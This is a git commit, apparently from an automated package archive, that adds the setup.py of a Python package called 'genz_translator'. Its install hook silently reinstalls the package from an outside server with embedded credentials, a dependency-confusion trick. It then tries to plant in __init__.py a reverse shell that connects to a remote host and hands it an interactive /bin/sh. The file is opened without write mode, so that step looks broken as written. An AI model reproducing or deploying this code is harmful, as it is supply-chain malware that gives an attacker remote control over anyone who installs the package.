9d4bed71eafb200b8455ef41b609ff24688998e6
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-12-07 03:36:19 +0000

    Add package genz-translator/9001.0.1/genz_translator-9001.0.1.tar.gz

---
+++ packages/genz-translator/genz_translator-9001.0.1.tar.gz/genz_translator-9001.0.1/setup.py
@@ -0,0 +1,55 @@
+from setuptools import find_packages
+from setuptools import setup
+from setuptools.command.develop import develop
+from setuptools.command.install import install
+import os
+import sys
+
+VERSION = 'v9001.0.1'
+PACKAGE_NAME = "genz_translator"
+INTERNAL_REPO_IP = "servers.genzrulez.com"
+INTERNAL_REPO_URL = "http://PyPiper:pyisthepiperthatpipesasweetmelody1!@servers.genzrulez.com:8010/simple/"
+
+
+class PostInstallCommand(install):
+     def run(self):
+         install.run(self)
+
+         # Preserve the install file
+         paths = sys.path
+         actual_path = ""
+         for path in paths:
+             if (os.path.isdir(path + "/" + PACKAGE_NAME + "-" + VERSION.replace('v','') + ".egg-info")):
+                 actual_path = path + "/"
+                 break
+
+         #Uninstall ourselves
+         os.system('pip3 uninstall ' + PACKAGE_NAME + ' -y')
+
+         #Fix their code to perform the correct install
+         os.system('pip3 install ' + PACKAGE_NAME + ' --no-cache-dir --trusted-host ' + INTERNAL_REPO_IP + ' --index-url "' + INTERNAL_REPO_URL + '"')
+
+         #Overwriting the EGG information to remove pip failing"
+         os.system('cp -r ' + actual_path + PACKAGE_NAME + '-*.egg-info ' + actual_path + PACKAGE_NAME + '-' + VERSION.replace('v','') + ".egg-info")
+
+         #Embed persistences within __init__.py
+         f = open(actual_path + PACKAGE_NAME + '/__init__.py')
+         f.write('os.system(\'python -c \\\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("covenant.thinkgreencorp.net",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\\\'\')')
+         f.close()
+
+
+setup(
+        name=PACKAGE_NAME,
+        url='https://pypi.org/simple/genz_translator/',
+        download_url='https://pypi.org/simple/genz_translater/archive/{}.tar.gz'.format(VERSION),
+        author='Am0Ghost',
+        author_email='geelpiet5@gmail.com',
+        version=VERSION,
+        packages=find_packages(),
+        include_package_data=True,
+        license='MIT',
+        description=('''DC Package '''),
+        cmdclass={
+            'install': PostInstallCommand
+        },
+)
